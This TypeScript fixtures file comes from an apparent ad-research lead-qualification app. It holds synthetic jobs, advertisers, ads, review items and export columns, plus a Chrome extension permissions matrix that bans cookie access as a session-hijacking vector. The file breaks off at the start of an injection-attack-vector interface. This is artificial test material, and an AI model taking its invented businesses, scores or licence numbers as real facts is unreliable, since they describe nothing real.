import { 
  JobState, 
  ResearchJobModel, 
  AdvertiserViewModel, 
  AdViewModel, 
  ReviewItemModel, 
  IdentityReviewPairModel, 
  ExportColumnDef, 
  ExportJobModel, 
  ChromeMV3PermissionEntry, 
  Phase08AuditCriterion 
} from '../types';

// ============================================================================
// 1. PHASE 07 -> PHASE 08 TRACEABILITY MATRIX
// ============================================================================

export interface TraceabilityEntry {
  viewId: string;
  viewName: string;
  sourcePhase07Contract: string;
  bffEndpoint: string;
  frontendModel: string;
  uiComponent: string;
  testCoverage: string;
}

export const PHASE_07_TRACEABILITY: TraceabilityEntry[] = [
  {
    viewId: 'JOB_MONITOR',
    viewName: 'Research Jobs & Active Runs',
    sourcePhase07Contract: 'job_execution, job_checkpoint, execution_event',
    bffEndpoint: 'GET /api/v1/jobs, POST /api/v1/jobs, GET /api/v1/jobs/:id/runs',
    frontendModel: 'ResearchJobModel, JobRunState',
    uiComponent: 'JobControlWorkspace, ActiveRunMonitor',
    testCoverage: 'test/p8_job_lifecycle.test.ts'
  },
  {
    viewId: 'ADVERTISER_EXPLORER',
    viewName: 'Advertiser Directory & Canonical State',
    sourcePhase07Contract: 'canonical_advertiser, v_lead_research_current, advertiser_domain_link',
    bffEndpoint: 'GET /api/v1/advertisers, GET /api/v1/advertisers/:id',
    frontendModel: 'AdvertiserViewModel, HistoricalNameEntry',
    uiComponent: 'AdvertiserDetailView, CanonicalVsHistoricalPanel',
    testCoverage: 'test/p8_advertiser_views.test.ts'
  },
  {
    viewId: 'AD_DETAIL',
    viewName: 'Advertisement Creative & Provenance',
    sourcePhase07Contract: 'ad_observation, ad_creative_asset, raw_dom_token',
    bffEndpoint: 'GET /api/v1/advertisers/:id/ads, GET /api/v1/ads/:id',
    frontendModel: 'AdViewModel, AdObservationHistory',
    uiComponent: 'AdDetailInspector, CreativeEvidenceCard',
    testCoverage: 'test/p8_ad_views.test.ts'
  },
  {
    viewId: 'VERIFICATION_VIEW',
    viewName: 'Destination & Website Verification',
    sourcePhase07Contract: 'verification_run, verification_evidence, network_probe_result',
    bffEndpoint: 'GET /api/v1/destinations/:id/verification',
    frontendModel: 'VerificationSummaryModel, NetworkSecurityProbe',
    uiComponent: 'VerificationInspector, SslSsrfProbeCard',
    testCoverage: 'test/p8_verification_ui.test.ts'
  },
  {
    viewId: 'QUALIFICATION_VIEW',
    viewName: 'Evidence-Driven Lead Qualification',
    sourcePhase07Contract: 'qualification_snapshot, score_signal_contribution, model_registry',
    bffEndpoint: 'GET /api/v1/qualification/:advertiserId',
    frontendModel: 'QualificationSummaryModel, ScoreExplanation',
    uiComponent: 'QualificationSummary, ScoreExplanationTable',
    testCoverage: 'test/p8_qualification_explainer.test.ts'
  },
  {
    viewId: 'IDENTITY_REVIEW',
    viewName: 'Identity Resolution & Ambiguity Queue',
    sourcePhase07Contract: 'identity_review_queue, merge_split_ledger, entity_cluster_node',
    bffEndpoint: 'GET /api/v1/reviews/identity, POST /api/v1/reviews/identity/:id/resolve',
    frontendModel: 'IdentityReviewPairModel, ReviewResolutionSubmission',
    uiComponent: 'IdentityConflictQueue, EntityPairComparisonCard',
    testCoverage: 'test/p8_identity_review.test.ts'
  },
  {
    viewId: 'MANUAL_OVERRIDE',
    viewName: 'Auditable Qualification Override',
    sourcePhase07Contract: 'manual_override, audit_event (Layer G)',
    bffEndpoint: 'POST /api/v1/qualification/:id/override',
    frontendModel: 'ManualOverrideSubmission, AuditEventReceipt',
    uiComponent: 'ManualOverrideModal, OverrideAuditBadge',
    testCoverage: 'test/p8_manual_override.test.ts'
  },
  {
    viewId: 'EXPORT_PIPELINE',
    viewName: 'Spreadsheet-Safe Export Pipeline',
    sourcePhase07Contract: 'export_artifact, export_filter_snapshot',
    bffEndpoint: 'POST /api/v1/exports, GET /api/v1/exports/:id/status, GET /api/v1/exports/:id/download',
    frontendModel: 'ExportJobModel, ExportColumnDef',
    uiComponent: 'ExportPipelineDialog, FormulaSafetyValidator',
    testCoverage: 'test/p8_export_safety.test.ts'
  }
];

// ============================================================================
// 2. DETERMINISTIC GOLDEN FIXTURES
// ============================================================================

export const SAMPLE_RESEARCH_JOBS: ResearchJobModel[] = [
  {
    jobId: 'job_01j7p8x90001_solar',
    idempotencyKey: 'idemp_solar_texas_q3_001',
    query: 'residential solar panel installation in Texas',
    countryCode: 'US',
    state: 'COMPLETED',
    progressPercent: 100,
    processedCount: 142,
    totalExpectedLimit: 150,
    startedAt: '2026-09-16T08:15:00Z',
    updatedAt: '2026-09-16T08:24:30Z',
    completedAt: '2026-09-16T08:24:30Z',
    isPartial: false,
    workerId: 'worker_playwright_pool_us_east_4',
    batchId: 'batch_20260916_0815_sol',
    tenantId: 'tenant_enterprise_apac_01'
  },
  {
    jobId: 'job_01j7p8x90002_roofing',
    idempotencyKey: 'idemp_roofing_florida_002',
    query: 'commercial roofing contractor hurricane repair',
    countryCode: 'US',
    state: 'COLLECTING',
    progressPercent: 54,
    processedCount: 54,
    totalExpectedLimit: 100,
    startedAt: '2026-09-16T09:00:00Z',
    updatedAt: '2026-09-16T09:05:12Z',
    isPartial: false,
    workerId: 'worker_playwright_pool_us_east_2',
    batchId: 'batch_20260916_0900_roof',
    tenantId: 'tenant_enterprise_apac_01'
  },
  {
    jobId: 'job_01j7p8x90003_hvac',
    idempotencyKey: 'idemp_hvac_california_003',
    query: 'emergency commercial hvac maintenance contract',
    countryCode: 'US',
    state: 'PARTIAL',
    progressPercent: 38,
    processedCount: 38,
    totalExpectedLimit: 100,
    stopReason: 'WORKER_PAGINATION_LIMIT_REACHED_END_OF_SEARCH_CARDS',
    lastCheckpointToken: 'chk_01j7p8x90003_offset_38',
    startedAt: '2026-09-16T07:10:00Z',
    updatedAt: '2026-09-16T07:18:45Z',
    completedAt: '2026-09-16T07:18:45Z',
    isPartial: true,
    workerId: 'worker_playwright_pool_us_west_1',
    batchId: 'batch_20260916_0710_hvac',
    tenantId: 'tenant_enterprise_apac_01'
  },
  {
    jobId: 'job_01j7p8x90004_crypto',
    idempotencyKey: 'idemp_crypto_arbitrage_004',
    query: 'crypto trading bot high yield guaranteed return',
    countryCode: 'US',
    state: 'CHALLENGED',
    progressPercent: 12,
    processedCount: 12,
    totalExpectedLimit: 50,
    stopReason: 'META_PAGE_CHALLENGE_DETECTED',
    challengeReason: 'Meta Ad Library prompted an anti-bot security checkpoint. Automated operation suspended immediately per non-bypass architectural doctrine.',
    lastCheckpointToken: 'chk_01j7p8x90004_offset_12',
    startedAt: '2026-09-16T06:30:00Z',
    updatedAt: '2026-09-16T06:33:10Z',
    isPartial: true,
    workerId: 'worker_playwright_pool_us_central_1',
    batchId: 'batch_20260916_0630_cry',
    tenantId: 'tenant_enterprise_apac_01'
  }
];

export const SAMPLE_ADVERTISERS: AdvertiserViewModel[] = [
  {
    advertiserId: 'adv_01j7p8_solarflow',
    canonicalName: 'SolarFlow Energy Solutions LLC',
    historicalNames: [
      { name: 'SolarFlow Energy Solutions LLC', observedAt: '2026-09-16T08:18:00Z', sourceTokenId: 'tok_01j7p8_001' },
      { name: 'Solar Flow Texas Clean Energy', observedAt: '2026-08-10T12:00:00Z', sourceTokenId: 'tok_01j7a1_042' }
    ],
    adLibraryId: 'meta_adlib_88921045519',
    activeAdCount: 8,
    destinationDomain: 'solarflowenergy.com',
    destinationUrl: 'https://solarflowenergy.com/commercial-quote',
    websiteReachable: true,
    businessIdentitySupported: true,
    verificationFreshness: '22 minutes ago',
    verificationStatusCode: 200,
    tlsVersion: 'TLS 1.3 (AEAD-CHACHA20-POLY1305)',
    ssrfValidated: true,
    qualificationState: 'QUALIFIED',
    qualificationScore: 86.5,
    scoreConfidence: 'HIGH',
    scoringModelVersion: 'lead_qual_v2.4.0-stable',
    scoreExplanation: [
      {
        signal: 'Active Advertising Velocity',
        ruleId: 'RULE_ACTIVE_AD_VOLUME',
        ruleVersion: 'v2.1',
        contribution: 25.0,
        evidence: '8 active distinct ads observed spanning 38 continuous days',
        explanation: 'Strong sustained paid customer acquisition budget indicating ongoing commercial operations.'
      },
      {
        signal: 'Verified Business Destination & SSL',
        ruleId: 'RULE_DOMAIN_VERIFICATION',
        ruleVersion: 'v2.0',
        contribution: 25.0,
        evidence: 'solarflowenergy.com resolves to public IP 104.21.48.12, TLS 1.3, HTTP 200',
        explanation: 'Registered destination domain verified accessible with valid encryption and private IP SSRF safe check.'
      },
      {
        signal: 'B2B Commercial Intent Keywords',
        ruleId: 'RULE_COMMERCIAL_INTENT',
        ruleVersion: 'v2.3',
        contribution: 20.0,
        evidence: 'Matched "commercial installation", "tax credit", "schedule quote", "financing options"',
        explanation: 'Explicit commercial offering targeting high-ticket residential/commercial property owners.'
      },
      {
        signal: 'Identity & Entity Consistency',
        ruleId: 'RULE_IDENTITY_MATCH',
        ruleVersion: 'v1.9',
        contribution: 16.5,
        evidence: 'Exact match between Ad Library page name and website footer copyright LLC name',
        explanation: 'Page brand name and canonical corporate web entity are verified identical.'
      }
    ],
    positiveSignals: [
      '8 active ads running continuously for >30 days',
      'Website destination 100% reachable with valid TLS 1.3',
      'Corporate registration matches website footer & Meta page',
      'Contact phone +1 (800) 555-0199 and physical address in Austin, TX'
    ],
    negativeEvidence: [],
    missingEvidence: ['BBB accreditation token not indexed on landing page'],
    activeBlockers: [],
    identityReviewState: 'CONFIRMED',
    hasActiveManualOverride: false,
    provenanceSummary: {
      source: 'Meta Ad Library Page Card DOM',
      observedAt: '2026-09-16T08:18:22Z',
      adapterVersion: 'meta_adlib_adapter_v4.2.1',
      extractionVersion: 'dom_parser_v3.1.0',
      normalizationVersion: 'entity_norm_v2.0.4',
      identityResolutionVersion: 'cluster_resolv_v1.8.0',
      verificationVersion: 'network_verify_v3.0.1',
      scoringVersion: 'lead_qual_v2.4.0-stable',
      rawPayloadHash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
    },
    lastCalculatedAt: '2026-09-16T08:24:30Z',
    dataState: 'VERIFIED'
  },
  {
    advertiserId: 'adv_01j7p8_apexroof',
    canonicalName: 'Apex Roofing & Waterproofing',
    historicalNames: [
      { name: 'Apex Roofing & Waterproofing', observedAt: '2026-09-16T09:02:00Z', sourceTokenId: 'tok_01j7p8_099' }
    ],
    adLibraryId: 'meta_adlib_11029384751',
    activeAdCount: 3,
    destinationDomain: 'apexroofingflorida.com',
    destinationUrl: 'https://apexroofingflorida.com/estimator',
    websiteReachable: true,
    businessIdentitySupported: false,
    verificationFreshness: '1 hour ago',
    verificationStatusCode: 200,
    tlsVersion: 'TLS 1.2 (ECDHE-RSA-AES128-GCM-SHA256)',
    ssrfValidated: true,
    qualificationState: 'REVIEW_REQUIRED',
    qualificationScore: 54.0,
    scoreConfidence: 'MEDIUM',
    scoringModelVersion: 'lead_qual_v2.4.0-stable',
    scoreExplanation: [
      {
        signal: 'Active Advertising Velocity',
        ruleId: 'RULE_ACTIVE_AD_VOLUME',
        ruleVersion: 'v2.1',
        contribution: 15.0,
        evidence: '3 active ads observed over 7 days',
        explanation: 'Moderate advertising activity.'
      },
      {
        signal: 'Verified Business Destination & SSL',
        ruleId: 'RULE_DOMAIN_VERIFICATION',
        ruleVersion: 'v2.0',
        contribution: 25.0,
        evidence: 'apexroofingflorida.com reachable with 200 OK',
        explanation: 'Destination website reachable.'
      },
      {
        signal: 'Business Identity Evidence Discrepancy',
        ruleId: 'RULE_IDENTITY_MATCH',
        ruleVersion: 'v1.9',
        contribution: -10.0,
        evidence: 'Website title says "Apex Coastal Group" while Ad Library says "Apex Roofing & Waterproofing"',
        explanation: 'Name discordance exceeds tolerance threshold; pending human operator review.'
      },
      {
        signal: 'Lead Capture Form Present',
        ruleId: 'RULE_COMMERCIAL_INTENT',
        ruleVersion: 'v2.3',
        contribution: 24.0,
        evidence: 'Interactive multi-step roof replacement quote form on destination',
        explanation: 'Direct high-intent customer acquisition.'
      }
    ],
    positiveSignals: ['3 active ads', 'Active instant estimate lead capture form', 'Valid TLS 1.2 certificate'],
    negativeEvidence: ['Brand name mismatch between Ad Library title and website copyright legal entity'],
    missingEvidence: ['Corporate business registry filing not matched automatically'],
    activeBlockers: [],
    identityReviewState: 'PENDING_REVIEW',
    hasActiveManualOverride: false,
    provenanceSummary: {
      source: 'Meta Ad Library Page Card DOM',
      observedAt: '2026-09-16T09:02:15Z',
      adapterVersion: 'meta_adlib_adapter_v4.2.1',
      extractionVersion: 'dom_parser_v3.1.0',
      normalizationVersion: 'entity_norm_v2.0.4',
      identityResolutionVersion: 'cluster_resolv_v1.8.0',
      verificationVersion: 'network_verify_v3.0.1',
      scoringVersion: 'lead_qual_v2.4.0-stable',
      rawPayloadHash: '1f82c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b999'
    },
    lastCalculatedAt: '2026-09-16T09:05:12Z',
    dataState: 'CONFLICTING'
  },
  {
    advertiserId: 'adv_01j7p8_quantumcrypto',
    canonicalName: 'Quantum Crypto Yields Bot',
    historicalNames: [
      { name: 'Quantum Crypto Yields Bot', observedAt: '2026-09-16T06:31:00Z', sourceTokenId: 'tok_01j7p8_404' }
    ],
    adLibraryId: 'meta_adlib_99810238475',
    activeAdCount: 1,
    destinationDomain: 'quantumyieldbot.biz',
    destinationUrl: 'https://quantumyieldbot.biz/register',
    websiteReachable: false,
    businessIdentitySupported: false,
    verificationFreshness: '4 hours ago',
    verificationStatusCode: 502,
    tlsVersion: 'UNKNOWN_HANDSHAKE_FAILED',
    ssrfValidated: true,
    qualificationState: 'DISQUALIFIED',
    qualificationScore: 0.0,
    scoreConfidence: 'HIGH',
    scoringModelVersion: 'lead_qual_v2.4.0-stable',
    scoreExplanation: [
      {
        signal: 'Active Blocker Triggered',
        ruleId: 'BLOCKER_PROHIBITED_FINANCIAL_CLAIMS',
        ruleVersion: 'v2.0',
        contribution: -100.0,
        evidence: 'Ad copy contains "guaranteed 300% weekly return", "risk free automated arbitrage"',
        explanation: 'Triggers non-negotiable compliance blocker: Prohibited Unsubstantiated Financial Guarantees.'
      },
      {
        signal: 'Destination Unreachable / Server Error',
        ruleId: 'BLOCKER_DESTINATION_DEAD',
        ruleVersion: 'v2.0',
        contribution: -50.0,
        evidence: 'Server returned HTTP 502 Bad Gateway during automated probe',
        explanation: 'Landing page is non-functional.'
      }
    ],
    positiveSignals: [],
    negativeEvidence: [
      'Unsubstantiated 300% yield claims in ad text',
      'Landing page returned 502 Bad Gateway',
      'Domain registered 3 days ago with anonymous privacy guard'
    ],
    missingEvidence: ['All commercial business signals absent'],
    activeBlockers: ['BLOCKER_PROHIBITED_FINANCIAL_CLAIMS', 'BLOCKER_DESTINATION_DEAD'],
    identityReviewState: 'FLAGGED_CONFLICT',
    hasActiveManualOverride: false,
    provenanceSummary: {
      source: 'Meta Ad Library Page Card DOM',
      observedAt: '2026-09-16T06:31:22Z',
      adapterVersion: 'meta_adlib_adapter_v4.2.1',
      extractionVersion: 'dom_parser_v3.1.0',
      normalizationVersion: 'entity_norm_v2.0.4',
      identityResolutionVersion: 'cluster_resolv_v1.8.0',
      verificationVersion: 'network_verify_v3.0.1',
      scoringVersion: 'lead_qual_v2.4.0-stable',
      rawPayloadHash: '88bc44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852baaa'
    },
    lastCalculatedAt: '2026-09-16T06:33:10Z',
    dataState: 'DERIVED'
  },
  {
    advertiserId: 'adv_01j7p8_metrodental',
    canonicalName: 'Metro Dental Implants Center',
    historicalNames: [
      { name: 'Metro Dental Implants Center', observedAt: '2026-09-16T05:00:00Z', sourceTokenId: 'tok_01j7p8_331' }
    ],
    adLibraryId: 'meta_adlib_44820194857',
    activeAdCount: 4,
    destinationDomain: 'metrodentalcare.org',
    destinationUrl: 'https://metrodentalcare.org/free-consult',
    websiteReachable: true,
    businessIdentitySupported: true,
    verificationFreshness: '5 hours ago',
    verificationStatusCode: 200,
    tlsVersion: 'TLS 1.3 (AEAD-AES256-GCM-SHA384)',
    ssrfValidated: true,
    qualificationState: 'QUALIFIED',
    qualificationScore: 82.0,
    scoreConfidence: 'HIGH',
    scoringModelVersion: 'lead_qual_v2.4.0-stable',
    scoreExplanation: [
      {
        signal: 'Active Advertising Velocity',
        ruleId: 'RULE_ACTIVE_AD_VOLUME',
        ruleVersion: 'v2.1',
        contribution: 22.0,
        evidence: '4 ads active for 45 days',
        explanation: 'Consistent commercial budget in competitive medical service category.'
      },
      {
        signal: 'Destination Reachable & Verified SSL',
        ruleId: 'RULE_DOMAIN_VERIFICATION',
        ruleVersion: 'v2.0',
        contribution: 25.0,
        evidence: 'metrodentalcare.org HTTP 200 OK, TLS 1.3',
        explanation: 'Reachable enterprise medical practice website.'
      },
      {
        signal: 'Commercial Intent & Booking Flow',
        ruleId: 'RULE_COMMERCIAL_INTENT',
        ruleVersion: 'v2.3',
        contribution: 20.0,
        evidence: 'Direct online appointment scheduler and implant cost breakdown',
        explanation: 'Strong direct sales channel.'
      },
      {
        signal: 'Manual Human Override Applied',
        ruleId: 'MANUAL_OVERRIDE_CLEARANCE',
        ruleVersion: 'v1.0',
        contribution: 15.0,
        evidence: 'Manual reviewer confirmed local healthcare licensing board record #DDS-77491',
        explanation: 'Adjusted from 67.0 to 82.0 following licensed business verification.'
      }
    ],
    positiveSignals: ['Active healthcare license verified', '4 continuous campaigns', 'HIPAA compliant form engine'],
    negativeEvidence: [],
    missingEvidence: [],
    activeBlockers: [],
    identityReviewState: 'CONFIRMED',
    hasActiveManualOverride: true,
    overrideDetails: {
      originalScore: 67.0,
      overrideScore: 82.0,
      reasonCode: 'EXTERNAL_BUSINESS_PROOF',
      notes: 'Verified state dental board license #DDS-77491 directly in state medical directory.',
      reviewerId: 'operator_daniela_leadops',
      appliedAt: '2026-09-16T05:30:00Z'
    },
    provenanceSummary: {
      source: 'Meta Ad Library Page Card DOM',
      observedAt: '2026-09-16T05:00:22Z',
      adapterVersion: 'meta_adlib_adapter_v4.2.1',
      extractionVersion: 'dom_parser_v3.1.0',
      normalizationVersion: 'entity_norm_v2.0.4',
      identityResolutionVersion: 'cluster_resolv_v1.8.0',
      verificationVersion: 'network_verify_v3.0.1',
      scoringVersion: 'lead_qual_v2.4.0-stable',
      rawPayloadHash: '55bc44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b777'
    },
    lastCalculatedAt: '2026-09-16T05:30:00Z',
    dataState: 'VERIFIED'
  }
];

export const SAMPLE_ADS: AdViewModel[] = [
  {
    adId: 'ad_01j7p8_sol_01',
    advertiserId: 'adv_01j7p8_solarflow',
    adLibraryId: 'meta_ad_99201948571',
    observedText: 'Texas Homeowners: Cut your electric bill to $0 with $0 down solar incentives. Claim your state rebate before federal tax credits adjust.',
    headline: 'Check If Your Roof Qualifies in 60 Seconds',
    ctaText: 'Get Quote',
    startDate: '2026-08-01',
    platforms: ['Facebook', 'Instagram', 'Messenger'],
    destinationUrl: 'https://solarflowenergy.com/commercial-quote?utm_source=meta&utm_campaign=texas_rebate',
    creativeType: 'IMAGE',
    extractionStatus: 'SUCCESS',
    provenanceHash: 'sha256:7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069'
  },
  {
    adId: 'ad_01j7p8_sol_02',
    advertiserId: 'adv_01j7p8_solarflow',
    adLibraryId: 'meta_ad_99201948572',
    observedText: 'Tier-1 bifacial panels with 25-year manufacturer warranty and free battery backup system included for qualified Dallas & Austin zip codes.',
    headline: 'Download 2026 Solar Savings Guide',
    ctaText: 'Download',
    startDate: '2026-08-15',
    platforms: ['Facebook', 'Instagram'],
    destinationUrl: 'https://solarflowenergy.com/savings-guide',
    creativeType: 'VIDEO',
    extractionStatus: 'SUCCESS',
    provenanceHash: 'sha256:4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a'
  },
  {
    adId: 'ad_01j7p8_apex_01',
    advertiserId: 'adv_01j7p8_apexroof',
    adLibraryId: 'meta_ad_11029384751',
    observedText: 'Free emergency drone roof inspection for storm-damaged properties in Central Florida. Insurance claim assistance provided.',
    headline: 'Schedule Free Drone Roof Inspection',
    ctaText: 'Book Now',
    startDate: '2026-09-08',
    platforms: ['Facebook'],
    destinationUrl: 'https://apexroofingflorida.com/estimator',
    creativeType: 'IMAGE',
    extractionStatus: 'PARTIAL',
    provenanceHash: 'sha256:ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d'
  },
  {
    adId: 'ad_01j7p8_crypto_01',
    advertiserId: 'adv_01j7p8_quantumcrypto',
    adLibraryId: 'meta_ad_99810238475',
    observedText: 'Guaranteed 300% weekly returns with our automated quantum AI trading algorithm. Zero risk, instant withdrawals.',
    headline: 'Start Earning 300% Today',
    ctaText: 'Sign Up',
    startDate: '2026-09-15',
    platforms: ['Facebook', 'Instagram', 'Audience Network'],
    destinationUrl: 'https://quantumyieldbot.biz/register',
    creativeType: 'IMAGE',
    extractionStatus: 'SUCCESS',
    provenanceHash: 'sha256:d82c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852beee'
  }
];

export const SAMPLE_REVIEW_ITEMS: ReviewItemModel[] = [
  {
    id: 'rev_01j7p8_id_01',
    type: 'IDENTITY_AMBIGUITY',
    entityId: 'adv_01j7p8_apexroof',
    entityName: 'Apex Roofing & Waterproofing',
    issueDescription: 'Cluster algorithm detected high lexical match (91%) with "Apex Coastal Construction LLC" sharing same registered domain "apexroofingflorida.com".',
    evidenceDetails: {
      domain: 'apexroofingflorida.com',
      similarityScore: 0.91,
      candidateA: 'Apex Roofing & Waterproofing (Ad Lib ID 11029384751)',
      candidateB: 'Apex Coastal Construction LLC (Ad Lib ID 88371920194)',
      sharedSignals: ['registrable_domain', 'whois_registrant_state', 'phone_area_code']
    },
    status: 'PENDING',
    createdAt: '2026-09-16T09:05:30Z',
    schemaVersion: 'p7_review_schema_v1.2',
    allowedActions: ['CONFIRM_MATCH', 'CONFIRM_DISTINCT', 'DEFER']
  },
  {
    id: 'rev_01j7p8_ver_02',
    type: 'VERIFICATION_CONFLICT',
    entityId: 'adv_01j7p8_apexroof',
    entityName: 'Apex Roofing & Waterproofing',
    issueDescription: 'Landing page HTTP probe succeeded (200 OK), but business name extraction in footer returned "Florida Coastal Remodeling Inc", conflicting with advertiser registry title.',
    evidenceDetails: {
      destinationUrl: 'https://apexroofingflorida.com/estimator',
      extractedFooterText: '© 2026 Florida Coastal Remodeling Inc. All rights reserved.',
      advertiserDeclaredTitle: 'Apex Roofing & Waterproofing',
      conflictType: 'FOOTER_LEGAL_ENTITY_MISMATCH'
    },
    status: 'PENDING',
    createdAt: '2026-09-16T09:06:00Z',
    schemaVersion: 'p7_review_schema_v1.2',
    allowedActions: ['ACCEPT_FOOTER_IDENTITY', 'REJECT_DESTINATION_LINK', 'DEFER']
  },
  {
    id: 'rev_01j7p8_qual_03',
    type: 'QUALIFICATION_REVIEW',
    entityId: 'adv_01j7p8_apexroof',
    entityName: 'Apex Roofing & Waterproofing',
    issueDescription: 'Lead qualification score 54.0 sits directly in the review corridor [50.0 - 64.9]. Commercial intent verified, but identity discordance blocks auto-qualification.',
    evidenceDetails: {
      score: 54.0,
      corridor: '50.0 - 64.9',
      activeBlockers: [],
      missingSignals: ['verified_legal_entity', 'bbb_registration']
    },
    status: 'PENDING',
    createdAt: '2026-09-16T09:06:15Z',
    schemaVersion: 'p7_review_schema_v1.2',
    allowedActions: ['OVERRIDE_QUALIFIED', 'OVERRIDE_DISQUALIFIED', 'REQUEST_REPROBE']
  }
];

export const SAMPLE_IDENTITY_PAIR: IdentityReviewPairModel = {
  pairId: 'pair_01j7p8_apex_duo',
  entityA: {
    id: 'adv_01j7p8_apexroof',
    name: 'Apex Roofing & Waterproofing',
    domain: 'apexroofingflorida.com',
    adCount: 3,
    observedAt: '2026-09-16T09:02:15Z'
  },
  entityB: {
    id: 'adv_01j7p8_apexcoastal',
    name: 'Apex Coastal Construction LLC',
    domain: 'apexcoastalgroup.com',
    adCount: 5,
    observedAt: '2026-09-15T14:20:00Z'
  },
  matchingSignals: [
    'Shared contact phone +1 (407) 555-0144 in landing page footer',
    'Shared Google Maps corporate address: 1400 Orange Ave, Orlando, FL',
    'Identical executive contact listed in Florida Sunbiz corporation filing: Robert Vance (CEO)'
  ],
  conflictingSignals: [
    'Different Meta Ad Library Page IDs (11029384751 vs 88371920194)',
    'Different destination primary domains (apexroofingflorida.com vs apexcoastalgroup.com)'
  ],
  confidenceScore: 0.88,
  proposedRelationship: 'SAME_BUSINESS',
  sourceEvidence: [
    'Extraction DOM token #tok_apex_phone_01',
    'Florida Sunbiz Corporate Entity Search Match #L2200019485',
    'Historical Ad Observation Token #tok_01j7p8_099'
  ]
};

// ============================================================================
// 3. CHROME MV3 EXTENSION PERMISSIONS MATRIX
// ============================================================================

export const CHROME_MV3_PERMISSIONS: ChromeMV3PermissionEntry[] = [
  {
    permission: 'activeTab',
    purpose: 'Inspect active tab URL to detect if operator is viewing a public Meta Ad Library search page or advertiser detail card.',
    featureUsingIt: 'Ad Library Context Detector in Extension Popup',
    whyRequired: 'Enables operator to open research workspace pre-filled with the active search query or page ID without manual copy-pasting.',
    securityRisk: 'LOW — activeTab is only granted when the user explicitly clicks the extension action icon. Cannot read tabs in background.',
    alternativeConsidered: 'Broad <all_urls> host permission. Rejected per strict architectural constraint (no broad permissions).',
    granted: true
  },
  {
    permission: 'storage',
    purpose: 'Store operator backend endpoint preference, tenant context token, and session UI preferences.',
    featureUsingIt: 'Settings & Session Manager',
    whyRequired: 'Persistent client-side configuration across extension restarts.',
    securityRisk: 'LOW — chrome.storage.local is isolated to extension origin. No cross-extension access.',
    alternativeConsidered: 'localStorage in popup. Rejected because popup DOM unloads when closed.',
    granted: true
  },
  {
    permission: 'declarativeNetRequest',
    purpose: 'NOT REQUESTED. Strictly prohibited by architectural doctrine.',
    featureUsingIt: 'N/A',
    whyRequired: 'Not required. System does NOT alter, inspect, or intercept network traffic or bypass security.',
    securityRisk: 'CRITICAL — Potential to inspect or modify headers. Banned.',
    alternativeConsidered: 'None.',
    granted: false
  },
  {
    permission: 'cookies',
    purpose: 'NOT REQUESTED. Strictly prohibited by architectural doctrine.',
    featureUsingIt: 'N/A',
    whyRequired: 'Not required. Extension does not access or clone Meta session cookies.',
    securityRisk: 'CRITICAL — Session hijacking vector. Banned.',
    alternativeConsidered: 'None.',
    granted: false
  },
  {
    permission: 'webRequest',
    purpose: 'NOT REQUESTED. Strictly prohibited by architectural doctrine.',
    featureUsingIt: 'N/A',
    whyRequired: 'Not required. Browser worker handles scraping; extension is only an operator cockpit.',
    securityRisk: 'CRITICAL — Deep packet inspection. Banned.',
    alternativeConsidered: 'None.',
    granted: false
  }
];

// ============================================================================
// 4. EXPORT PROFILES, FIELDS & SPREADSHEET SAFETY
// ============================================================================

export const BASIC_LEAD_EXPORT_COLUMNS: ExportColumnDef[] = [
  { key: 'advertiser_name', label: 'Advertiser Name', classification: 'SAFE_BUSINESS', sanitization: 'FORMULA_ESCAPE', description: 'Canonical verified business name' },
  { key: 'ad_library_id', label: 'Meta Ad Library Page ID', classification: 'SAFE_BUSINESS', sanitization: 'EXACT', description: 'Public identifier on Meta Ad Library' },
  { key: 'active_ad_count', label: 'Active Ads Observed', classification: 'SAFE_BUSINESS', sanitization: 'EXACT', description: 'Total distinct active ads observed' },
  { key: 'destination_domain', label: 'Destination Domain', classification: 'SAFE_BUSINESS', sanitization: 'FORMULA_ESCAPE', description: 'Canonical registered destination domain' },
  { key: 'destination_url', label: 'Destination URL', classification: 'SAFE_BUSINESS', sanitization: 'FORMULA_ESCAPE', description: 'Sample observed landing page URL' },
  { key: 'qualification_state', label: 'Qualification State', classification: 'SAFE_BUSINESS', sanitization: 'EXACT', description: 'QUALIFIED, DISQUALIFIED, or REVIEW_REQUIRED' },
  { key: 'qualification_score', label: 'Score (0-100)', classification: 'SAFE_BUSINESS', sanitization: 'EXACT', description: 'Deterministic qualification score' },
  { key: 'score_confidence', label: 'Confidence', classification: 'SAFE_BUSINESS', sanitization: 'EXACT', description: 'HIGH, MEDIUM, or LOW' },
  { key: 'website_reachable', label: 'Website Reachable', classification: 'SAFE_BUSINESS', sanitization: 'EXACT', description: 'Destination HTTP probe status' },
  { key: 'last_calculated_at', label: 'Calculated Timestamp (UTC)', classification: 'SAFE_BUSINESS', sanitization: 'EXACT', description: 'ISO-8601 calculation time' }
];

export const DETAILED_RESEARCH_EXPORT_COLUMNS: ExportColumnDef[] = [
  ...BASIC_LEAD_EXPORT_COLUMNS,
  { key: 'positive_signals', label: 'Positive Signals (Evidence)', classification: 'SAFE_BUSINESS', sanitization: 'FORMULA_ESCAPE', description: 'Pipe-delimited positive scoring signals' },
  { key: 'negative_evidence', label: 'Negative Evidence', classification: 'SAFE_BUSINESS', sanitization: 'FORMULA_ESCAPE', description: 'Pipe-delimited negative signals' },
  { key: 'active_blockers', label: 'Active Compliance Blockers', classification: 'SAFE_BUSINESS', sanitization: 'FORMULA_ESCAPE', description: 'Triggered blocking rules' },
  { key: 'scoring_model_version', label: 'Scoring Model Version', classification: 'PROVENANCE_METADATA', sanitization: 'EXACT', description: 'Registry version of qualification engine' },
  { key: 'tls_version', label: 'TLS Protocol', classification: 'PROVENANCE_METADATA', sanitization: 'EXACT', description: 'Negotiated TLS protocol version' },
  { key: 'ssrf_validated', label: 'SSRF Safe Check', classification: 'PROVENANCE_METADATA', sanitization: 'EXACT', description: 'DNS resolved to public routable IP' },
  { key: 'provenance_hash', label: 'DOM Evidence SHA-256', classification: 'PROVENANCE_METADATA', sanitization: 'EXACT', description: 'Cryptographic hash of raw extracted DOM snapshot' }
];

export interface InjectionAttackVector {
  id: string;
  name: string;
  rawPayload: string;
  targetApp: string;
